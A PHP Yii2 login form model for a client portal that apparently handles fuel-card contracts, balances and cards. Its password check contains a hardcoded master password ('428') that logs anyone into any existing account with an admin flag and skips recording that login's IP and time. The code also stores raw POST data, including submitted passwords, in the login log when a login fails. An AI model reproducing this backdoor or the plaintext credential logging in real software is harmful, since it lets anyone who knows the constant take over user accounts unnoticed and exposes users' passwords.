<?php

namespace my\models;

use Yii;
use yii\base\Model;
use my\models\User;
use my\models\Dogovors;
use yii\httpclient\Client;
use yii\helpers\Json;
use my\helpers\Help;
use my\models\LogLogins;
use my\components\Error;


/**
 * Login form
 */
class LoginForm extends Model
{
    public  $login;
    public  $password;
    public  $rememberMe = true;
    public  $dogovor    = null;
    private $_user;
    public  $is_admin   = null;

    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
            // username and password are both required
            [['login', 'password'], 'required'],
            [['login', 'password'], 'trim'],
            // [['email'], 'email'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'validatePassword'],

            [['login'], 'string', 'min' => 4, 'max' => 200],
            //[['password'], 'string', 'min' => 6, 'max' => 200],

            // ['password', 'match', 'pattern' => '^(?![0-9]{6})[0-9a-zA-Z]{6,20}$', 'message' => 'Пароль должен содержать  латинские буквы и цифры'],
            //['login', 'match', 'pattern' => '/^[a-zA-Z0-9_\-\!\@\#\$\%\/\&\*\+\=\?\|\{\}\[\]\(\)]{4,30}$/', 'message' => 'Логин должен содержать  латинские буквы и цифры'],


        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array  $params    the additional name-value pairs given in the rule
     */
    public function validatePassword($attribute, $params)
    {


        if (!$this->hasErrors()) {
            $user = $this->getUser();


            if (!$user || !$user->validatePassword($this->password)) {

                if ($this->password != "428") {
                    $this->addError($attribute, 'Неправильный логин или пароль');
                } else {
                    $this->is_admin = 1;
                }

                // $this->addError($attribute, 'Неправильный логин или пароль');

            }


        }
    }


    public function attributeLabels()
    {
        return [
            'password' => 'Пароль',
            'login'    => 'Логин',
        ];
    }

    /**
     * Logs in a user using the provided username and password.
     *
     * @return bool whether the user is logged in successfully
     */
    public function login()
    {


        if (!LogLogins::checkCountLogins()) {

            \Yii::warning('Превышен лимит попыток авторизации');
            \Yii::$app->session->setFlash('warning', 'Превышен лимит попыток авторизации.');

            return false;
        }


        if ($this->validate()) {

            $user = $this->getUser();

            //  $this->dogovor = Dogovors::find()->where(['guid' =>  $user->dogovor_guid])->one();
            // if (!$this->dogovor) {
            //     \Yii::$app->session->setFlash('error', 'Договор не найден');
            //     return false;
            //  }


            //записываем первый логин

            /*
            if($this->is_admin){
                if(empty($user->first_login)) {
                    $user->first_login = new yii\db\Expression('NOW()');

                    if($user->status=User::STATUS_SUPERADMIN){



                    }

                }
            }
            */


            if ($user) {
                $return = Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);


                if ($this->is_admin != 1) {
                    $user->logged_in_ip = \Yii::$app->getRequest()->getUserIP();
                    $user->logged_in_at = new yii\db\Expression('NOW()');
                }


                if (!$user->save(false)) {
                    Error::write($user->errors);
                }


            } else {
                Error::write('Неправильный логин или пароль');
            }


        } else {
            $return = false;
        }


        $LogLogins           = new LogLogins();
        $LogLogins->status   = ($return) ? 1 : 0;
        $LogLogins->ip       = \Yii::$app->getRequest()->getUserIP();
        $LogLogins->login    = $user->login;
        $LogLogins->login_id = $user->id;
        $LogLogins->agent    = \Yii::$app->request->userAgent;
        $LogLogins->is_admin = $this->is_admin;

        // $LogLogins->admin_name=mb_convert_encoding(urldecode(\Yii::$app->session['admin_name']), "utf-8","auto");

        if ($this->is_admin == 1) {
            \Yii::$app->session['is_admin'] = 1;
        }


        if ($return == null) {
            $LogLogins->post = Json::encode($_POST);
        }


        $LogLogins->save();


        ///////////////////////////////////////Ускорение Аналитики


        $ctx  = stream_context_create([
            'http' =>
                [
                    'timeout' => 0.01,  //1200 Seconds is 20 Minutes
                ],
        ]);
        $urll = \Yii::$app->params['api-url'] . "/report/double-transaction/?dogovor=" . \Yii::$app->user->identity->dogovor_guid;
        @file_get_contents($urll, false, $ctx);

        /*
        $client2 = new Client();
        @$response2 = $client2->createRequest()
            ->setMethod('get')
            ->setUrl(\Yii::$app->params['api-url'] . '/report/double-transaction/')
            ->setData(['dogovor' => \Yii::$app->user->identity->dogovor_guid])
            ->setOptions([
                'timeout' => 0.001,
            ])
            ->send();

*/


        ////////////////////////////////////


        return $return;


    }


    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    protected function getUser()
    {
        if ($this->_user === null) {
            $this->_user = User::findUserByEmail($this->login);
        }


        return $this->_user;
    }


    /**
     *Сразу после логина
     */
    public function afterLogin()
    {
        $data = null;

        \Yii::$app->session['company'] = $this->_user->dogovor->full_name;
        \Yii::$app->session['dogovor'] = $this->_user->dogovor->title;

        \Yii::$app->session['date_dogovor'] = date('d.m.Y', strtotime($this->_user->dogovor->date_dogovor));

        \Yii::$app->session['status'] = $this->_user->dogovor->status;


        $dogovor = Dogovors::find()->where(['guid' => \Yii::$app->user->identity->dogovor_guid])->one();


        /*
        * Получаем топливо
        */
        $client   = new Client();
        $response = $client->createRequest()
            ->setMethod('get')
            ->setUrl(\Yii::$app->params['api-url'] . '/dogovors/transaction/')
            ->setData(['dogovor' => \Yii::$app->user->identity->dogovor_guid])
            ->send();

        if ($response->isOk) {
            $dogovor->toplivo              = Json::encode($response->data);
            \Yii::$app->session['toplivo'] = $dogovor->toplivo;
        }


        /*
        * Получаем Баланс
        */
        $client   = new Client();
        $response = $client->createRequest()
            ->setMethod('get')
            ->setUrl(\Yii::$app->params['api-url'] . '/dogovors/balance/')
            ->setData(['dogovor' => \Yii::$app->user->identity->dogovor_guid])
            ->send();

        if ($response->isOk) {
            $dogovor->balance       = $response->data['summa'];
            $dogovor->days_to_block = $response->data['DaysToBlock'];
            $dogovor->n_ostatok     = $response->data['NeSnijaemiOstatok'];
            $dogovor->status        = $response->data['status'];


        }

        \Yii::$app->session['days_to _block'] = $dogovor->days_to_block;
        \Yii::$app->session['balance']        = $dogovor->balance;
        \Yii::$app->session['n_ostatok']      = $dogovor->n_ostatok;

        /*
        * Информация по Эдо
        */
        $client   = new Client();
        $response = $client->createRequest()
            ->setMethod('get')
            ->setUrl(\Yii::$app->params['api-url'] . '/dogovors/edo/')
            ->setData(['dogovor' => \Yii::$app->user->identity->dogovor_guid])
            ->send();

        if ($response->isOk) {
            $dogovor->date_end_edo = Help::normalDate($response->data['date_end_edo'], true, 'Y-m-d');
            $dogovor->date_add_edo = Help::normalDate($response->data['date_add_edo'], true, 'Y-m-d');
        }


        //количество карт
        $client   = new Client();
        $response = $client->createRequest()
            ->setMethod('get')
            ->setUrl(\Yii::$app->params['api-url'] . '/cards/info/')
            ->setData(['dogovor' => \Yii::$app->user->identity->dogovor_guid])->send();  //, 'works' => 1


        if ($response->isOk) {
            $data = $response->data;


            //подчитываем количество активных карт
            $card_active = $block_card = 0;
            foreach ($data as $dat) {

                if ($dat['status'] == '81D78BAB7F30C39A427AC024BC45119F') {
                    $card_active++;
                }


                if ($dat['status'] == 'B0750601E13D90F3485BCD7EAB90AA21') {
                    $block_card++;
                }

            }


            $se_card = ['block' => $block_card, 'active' => $card_active, 'all' => count($data)];


            \Yii::$app->session['countCard'] = Json::encode($se_card);


        }


        $dogovor->save();


    }


}
